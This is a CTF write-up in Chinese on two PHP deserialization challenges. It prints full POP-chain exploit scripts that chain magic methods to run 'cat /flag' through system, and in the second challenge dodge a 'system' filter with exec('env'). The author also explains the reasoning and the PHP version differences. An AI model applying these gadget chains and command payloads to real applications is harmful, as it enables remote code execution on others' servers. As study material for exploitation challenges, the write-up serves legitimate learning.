# 第十九章

```php
<?php
class Person
{
    public $name;
    public $id;
    public $age;

    public function __invoke($id) //将对象当作函数调用时调用
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
    
    public function __construct($name,$id,$age)
    {
        $this->name=$name;
        $this->age=$age;
        $this->id=$id;
    }
}

class PersonA extends Person
{
    public function __destruct() //类似析构函数
    {
        $name = $this->name;
        $id = $this->id;
        $age = $this->age;
        $name->$id($age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value) //设置不可访问或不存在的属性时调用
    {
        $this->name = $value;
    }
}

class PersonC extends Person
{
    public function __Check($age)
    {
        if(strpos($this->age . $this->name,"flag")!== false) //本地环境没有str_contains
        {
            die("Hacker!");
        }
        $name = $this->name;
        $name($age);
    }

    public function __wakeup() //反序列化时调用
    {
        $age = $this->age;
        $name = $this->id;
        $name->age = $age;
        $name($this);
    }
}
$personC=new PersonC("system","system","a");
$personA=new PersonA($personC,'__Check','cat /flag');
$person=new PersonC('b',$personA,'c');
echo serialize($person);
```
事实上我不知道它为什么能行……以下只是我做题时的思路

唯一一个有`__wakeup`函数的类是`PersonC`，因此入口点肯定在这。先给`Person`基类加个构造函数方便传字段值。`__wakeup`的末尾调用了`$name`，或者说`$this->id`，因此`$this->id`得是个类

我最初的思路是用PersonA，让`__invoke`覆盖掉某个变量（一个类）从而触发被覆盖的变量的`__destruct`函数（因为不存在那个变量的引用了）。`__destruct`里`$name`是PersonC，`$id`是`__Check`,`$age`是参数。最后让那个`PersonC`类的`$name`为system

听起来非常的绕，实际上也确实非常的绕。绕到我自己此时并未明白上述思路该怎么构造。我只能构造一半，因反序列化链走到`__Check`之前php会报错，比如什么"a不可调用"；warning也一大堆，”给不是对象的变量赋值属性“……

不过因为我传参数时用字母来占位，所以我可以知道“a”来自于哪个类，随即将其换成函数。就怎么哼哧哼哧地改，突然它自己莫名其妙就完成了，伴随着一堆warning

远程测试时相同的payload会触发Fatal error（似乎新版本不允许给不是对象的变量赋值属性了。在旧版本这里只会有warning），但触发error之前已经执行命令并输出了结果

# revenge

似乎我最初的思路以及和预期解法很相似了，只是需要简化一些东西。把`__invoke`从基类拿出去后终于没那么乱了（
```php
<?php
class Person
{
    public $name;
    public $id;
    public $age;
    public function __construct($name,$id,$age)
    {
        $this->name=$name;
        $this->age=$age;
        $this->id=$id;
    }
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $name->$id($this->age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonC extends Person
{
    public function check($age)
    {
        $name=$this->name;
        if($age == null)
        {
            die("Age can't be empty.");
        }
        else if($name === "system")
        {
            die("Hacker!");
        }
        else
        {
            var_dump($name($age));
        }
    }

    public function __wakeup()
    {
        $name = $this->id;
        $name->age = $this->age;
        $name($this);
    }
}
$personA=new PersonA('g','check','i');
$personB=new PersonB('env',$personA,'f');
$person=new PersonC('exec',$personB,'c');
echo serialize($person);
```
触发点还是PersonC的`__wakeup`。这次只有`PersonB`有`__invoke`函数，因此`$this->id`必然是`PersonB`。然后需要澄清之前的一个误区。我之前以为必须要让某个引用是一个类，然后将那个引用覆盖掉才能触发那个类的析构函数。事实上，可以直接让`$this->id`为`PersonA`，`__invoke`执行完毕后就可以触发析构函数了

`__invoke`修改`PersonA`的name为`PersonC`，age为`PersonB`的name。让`PersonA`的id为check，随后`__destruct`执行的就是`PersonC->check($age)`了。system的过滤可以用别的函数绕过，比如exec